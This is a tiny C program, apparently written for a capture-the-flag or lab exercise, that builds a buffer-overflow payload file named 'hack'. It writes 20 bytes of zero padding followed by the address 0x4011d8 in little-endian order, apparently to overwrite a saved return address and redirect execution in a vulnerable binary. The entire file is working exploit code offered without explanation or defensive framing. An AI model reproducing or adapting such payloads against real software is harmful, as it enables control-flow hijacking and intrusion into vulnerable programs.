#include <stdio.h>
#include <stdlib.h>

int main() {
  FILE *file = fopen("hack", "wb");
  if (file) {
    char arr[28] = {0};
    arr[20] = (char)0xd8;
    arr[21] = (char)0x11;
    arr[22] = (char)0x40;
    fwrite(arr, 1, 28, file);
    fclose(file);
  }
  return 0;
}